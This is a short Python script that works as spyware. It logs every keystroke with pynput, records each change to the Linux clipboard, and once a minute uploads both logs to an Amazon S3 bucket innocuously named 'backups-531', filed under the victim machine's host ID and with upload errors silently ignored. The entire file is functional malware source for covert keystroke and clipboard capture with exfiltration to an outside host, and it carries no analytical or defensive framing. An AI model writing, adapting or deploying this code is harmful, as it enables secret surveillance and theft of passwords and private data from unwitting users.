import subprocess
from pynput.keyboard import Key, Listener
import logging
import time
import threading
import boto3
from uuid import uuid4

log_dir = "/opt/webcontent/aws/"
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def get_clipboard_contents_linux():
    return subprocess.check_output(['xclip', '-selection', 'clipboard', '-o']).decode()

def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def clipboard_monitor():
    clipboard_content = get_clipboard_contents_linux()
    f = open("/opt/webcontent/aws/clipboard.txt", "a")
    f.write(clipboard_content + "\n")
    f.close()

    while True:
        new_clipboard_content = get_clipboard_contents_linux()
        if clipboard_content != new_clipboard_content:
            clipboard_content = new_clipboard_content
            f = open("/opt/webcontent/aws/clipboard.txt", "a")
            f.write(clipboard_content + "\n")
            f.close()
        
        time.sleep(1)

def upload_to_aws(file_path, bucket_name, key_name):
    s3 = boto3.client('s3')
    try:
        s3.upload_file(file_path, bucket_name, key_name)
    except Exception as e:
        pass

keylogger_thread = threading.Thread(target=keylogger)
clipboard_thread = threading.Thread(target=clipboard_monitor)

keylogger_thread.start()
clipboard_thread.start()

while True:
    host_id = subprocess.check_output("hostid", shell=True).decode().strip("\n")
    upload_to_aws("/opt/webcontent/aws/key_log.txt", "backups-531", f"{host_id}/key_log_{str(uuid4())}.txt")
    upload_to_aws("/opt/webcontent/aws/clipboard.txt", "backups-531", f"{host_id}/clipboard_{str(uuid4())}.txt")
    time.sleep(60)